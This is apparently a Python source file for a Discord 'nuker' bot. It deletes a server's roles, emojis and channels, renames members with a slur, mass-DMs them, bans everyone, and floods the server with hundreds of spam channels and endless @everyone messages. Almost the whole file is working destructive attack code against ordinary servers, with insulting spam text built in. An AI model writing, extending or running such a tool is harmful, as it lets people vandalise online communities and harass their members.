import discord
from discord.ext import commands
from discord.ext.commands import bot
from dotenv import load_dotenv
import time
import random
import os
from discord import app_commands

#Enter your bot token in the .env file no need to change anything here. 
load_dotenv()
token = os.getenv('token')


intents = discord.Intents.all()
#You can edit/add the name of channels bot will create while nuking.
SPAM_CHANNEL = ['NUKED', 'OAF', 'LOSERS', 'MF', 'CRINGE', 'GAEEEE']
#This is the message bot will spam on all channels while nuking.Currently it spams some gifs but you can change it as your choice

SPAM_MESSAGE = [
  '@everyone get nuked losers',
  '@everyone lmao losers',
  '@everyone https://tenor.com/view/jessicasprings0-mulsup-ludwig-xqc-picmix-gif-25632447',
  '@everyone https://tenor.com/view/love-you-miss-kiss-gif-26539458',
  '@everyone https://tenor.com/view/447134-angela-gif-20502032',
  '@everyone https://tenor.com/view/new-york-mets-gif-24783527',
  '@everyone https://tenor.com/view/megumin-konosuba-explosion-meledak-ledakan-gif-12327270',
  '@everyone https://tenor.com/view/rage-broccoli-nuke-gachibrocc-gachi-gif-21547004',
  '@everyone https://tenor.com/view/nuke-nuclear-explosion-gif-14867944',
  '@everyone https://tenor.com/view/take-the-l-art-loser-gif-13820755',
  '@everyone https://tenor.com/view/sweep-gif-22607450',
  '@everyone https://tenor.com/view/ugly-funny-meme-memes-haha-gif-18058745',
  '@everyone https://cdn.discordapp.com/attachments/997498657949618206/1034700166000803950/image0-2-2-1.gif',
  '@everyone Get nuked by OrginalAssFace'
]
#here u can edit/add how to trigger bot.
client = commands.Bot(command_prefix=commands.when_mentioned_or("!"),
                      help_command=None,
                      intents=intents)




@client.event
async def on_ready():
  print('We have logged in as {0.user}'.format(client))
  servers = len(client.guilds)
  members = 0
  for guild in client.guilds:
    members += guild.member_count - 1

  #This will add your activity. Right now it says "coding with peoples"
    
  await client.change_presence(
    activity=discord.Activity(type=discord.ActivityType.playing,
                              name=f'coding  with {members} people'))

 
# This is the first command which you can trigger with either mentioning bot and typing n (@originalassface n) or typing "!n". 
#This command will start by deleting all roles follwing with emojis and change most of your nicknames to gay then message all members that server has been nuked.At last it will start to delete all channels and spam messages.
  
@client.command()
async def n(ctx):
  await ctx.message.delete()
  for role in list(ctx.guild.roles):
    try:
      await role.delete()
      print(f"{role.name} has been deleted")
    except:
      pass
  print("Nuked Roles")
  for emoji in list(ctx.guild.emojis):
    try:
      await emoji.delete()
      print(f"{emoji.name} has been deleted")
    except:
      pass
  print("Nuked Emotes")

  for member in list(client.get_all_members()):
    try:
      await member.edit(nick="gay")
    except:
      pass
  print("Nickname Nuked")

  for member in list(client.get_all_members()):
    try:
      await member.send("Server has been nuked by OriginalAssFace")
    except:
      pass
    print("Action completed: Message all")

  for chan in ctx.guild.channels:
    try:
      await chan.delete()
      await chan.delete()
      await chan.delete()

    except:
      pass
  await ctx.guild.create_text_channel('nuked')
  channel = discord.utils.get(client.get_all_channels(),
                              guild=ctx.author.guild,
                              name='nuked')
  await channel.send("@everyone You got nuked by OriginalAssFace")

  for channel in list(ctx.message.guild.channels):
    try:
      await channel.delete()
      print(channel.name + " has been deleted")
    except:
      pass
    guild = ctx.message.guild
    channel = await guild.create_text_channel("nuked")
    await channel.send(
      " @everyone This server has been Nuked by OriginalAssFace")
    await channel.send(content=" @everyone NUKED LOSERS!!")

  
  for channel in guild.text_channels:
    await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    await channel.send(random.choice(SPAM_MESSAGE))
    await channel.send(random.choice(SPAM_MESSAGE))
  amount = 500
  for i in range(amount):
    await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    await guild.create_text_channel(random.choice(SPAM_CHANNEL))
    await guild.create_voice_channel(random.choice(SPAM_CHANNEL))
  print(f"nuked {guild.name} Successfully.")
  return

  for member in list(client.get_all_members()):
    try:
      await guild.ban(member)
      print("User " + member.name + " has been banned")
    except:
      pass
  print("Action completed: Ban all")


#ban everyone


@client.command()
async def ban(ctx):
  await ctx.message.delete()
  guild = ctx.message.guild
  for member in list(client.get_all_members()):
    try:
      await guild.ban(member)
      print("User " + member.name + " has been banned")
    except:
      pass
  print("Action completed: Ban all")


#removes all channels


@client.command()
async def rem(ctx):
  await ctx.message.delete()
  for chan in ctx.guild.channels:
    try:
      await chan.delete()
    except:
      pass
  print("Removed all channels")


#any command can trigger this
#sends messages fom (spam channel) list


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(SPAM_MESSAGE))


client.run(token)
